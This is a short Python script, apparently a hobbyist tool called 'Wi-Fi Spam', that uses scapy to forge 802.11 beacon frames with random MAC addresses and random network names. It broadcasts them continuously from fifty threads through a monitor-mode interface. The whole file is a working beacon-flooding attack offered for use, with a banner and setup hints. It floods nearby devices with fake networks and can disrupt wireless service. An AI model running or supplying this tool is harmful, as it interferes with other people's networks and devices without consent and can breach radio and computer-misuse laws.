import threading
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, RandMAC
import random
import string
import time

class colors:
    YELLOW = "\033[93m"  
    BLUE = "\033[94m"    
    END = "\033[0m"

print(colors.YELLOW + "==========================================================\n" + colors.END)
print(colors.BLUE + 
" __        ___       _____ _   ____                         \n" +
" \\ \\      / (_)     |  ___(_) / ___| _ __   __ _ _ __ ___  \n" +
"  \\ \\ /\\ / /| |_____| |_  | | \\___ \\| '_ \\ / _` | '_ ` _ \\ \n" +
"   \\ V  V / | |_____|  _| | |  ___) | |_) | (_| | | | | | |\n" +
"    \\_/\\_/  |_|     |_|   |_| |____/| .__/ \\__,_|_| |_| |_|\n" +
"                                   |_|                       " + colors.END)
print(colors.YELLOW + "\n==========================================================\n" + colors.END)

print("BY DYGRAL\n")

time.sleep(5)

# This generates the random name to the network
def generar_codigo(length=8):
    caracteres = string.ascii_letters + string.digits  
    codigo = ''.join(random.choices(caracteres, k=length))
    return codigo


def create_wifi():
	interface = "<Change it whith your interface in monitor mode>"
	sender = RandMAC() 
	access_point_name =  generar_codigo() 

	dot11 = Dot11(type=0, subtype=8, 
				addr1="ff:ff:ff:ff:ff:ff", 
				addr2=sender, addr3=sender) 
	beacon = Dot11Beacon() 

	e_SSID = Dot11Elt(ID="SSID", info=access_point_name, 
					len=len(access_point_name)) 

	frame = RadioTap()/dot11/beacon/e_SSID 

	sendp(frame, inter=0.1, iface=interface, loop=1, verbose=0) 


threads = []

print(f"[+] Spammer working")
print(f"[?] Send CTRL+C twice to stop the spammer")

# Change the range to your choice
for i in range(50):
		thread = threading.Thread(target=create_wifi)
		threads.append(thread)
		thread.start()
	
for thread in threads:
		thread.join()


